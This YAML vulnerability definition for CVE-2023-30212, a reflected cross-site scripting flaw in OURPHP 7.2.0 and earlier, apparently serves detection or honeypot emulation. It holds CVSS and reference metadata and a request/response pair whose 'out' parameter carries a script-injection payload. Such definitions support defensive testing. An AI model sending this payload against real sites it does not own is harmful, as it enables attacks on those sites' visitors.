id: CVE-2023-30212
info:
  name: OURPHP <= 7.2.0 -  Cross Site Scripting
  author: theamanrawat
  description: 'OURPHP <= 7.2.0 is vulnerale to Cross Site Scripting (XSS) via /client/manage/ourphp_out.php.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: 'Upgrade to a patched version of OURPHP (7.2.1 or higher) to mitigate
    this vulnerability.

    '
  reference:
  - https://www.ourphp.net/
  - https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30212
  - https://github.com/JasaluRah/Creating-a-Vulnerable-Docker-Environment-CVE-2023-30212-
  - https://github.com/arunsnap/CVE-2023-30212-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-30212
    cwe-id: CWE-79
    epss-score: 0.02578
    epss-percentile: 0.89997
    cpe: cpe:2.3:a:ourphp:ourphp:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: ourphp
    product: ourphp
  tags: cve2023,cve,xss,ourphp
traps:
- request:
    method: GET
    path: /client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: location.href='../..</script><script>alert(document.domain)</script>'
